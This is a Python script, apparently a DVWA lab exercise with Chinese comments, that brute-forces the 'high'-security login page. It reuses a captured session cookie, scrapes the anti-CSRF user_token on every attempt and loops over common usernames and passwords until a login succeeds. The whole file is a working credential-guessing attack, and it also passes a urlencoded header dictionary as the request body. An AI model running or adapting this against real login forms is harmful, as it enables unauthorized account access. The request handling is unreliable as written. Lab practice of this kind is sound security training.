# python3
import urllib.request
import re
import urllib.parse

# 本地IP地址
IP = '172.16.3.201:1234'
# sessionid，通过抓包查找
PHPSESSID = 'scdke8rnnrcdthltl22vss77k0'
  
#设置cookie
opener = urllib.request.build_opener()
opener.addheaders.append(('Cookie', 'security=high; PHPSESSID=' + PHPSESSID))

#用户名字典
usernames = ['admin','manage','system','root']
#密码字典
passwords = ['admin','root','123456','password','abc123','111111','qwerty','000000']

for username in usernames:
    for password in passwords:

        # 访问首页
        response = opener.open('http://' + IP + '/DVWA-1.9/vulnerabilities/brute/')
        content = response.read().decode()
        # 获取user_token
        user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)",content)[0]
        # 发送登录数据包
        url = 'http://'+IP+'/DVWA-1.9/vulnerabilities/brute/?username='+username+'&password='+password+'&Login=Login&user_token='+user_token

        headers = {'User-Agent': 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'} 
        headers = urllib.parse.urlencode(headers).encode('utf-8')

        req = urllib.request.Request(url, headers)
        
        response = opener.open(req)
        content = response.read().decode() 
        
        # 确认破解结果
        print ('-'*20)
        print (u'用户名：'+username)
        print (u'密码：'+password)
        if 'Username and/or password incorrect.' in content:
            print (u'破解结果：失败')
            print ('-'*20)
        else:
            print (u'破解结果：成功')
            print ('-'*20)
            exit(0)

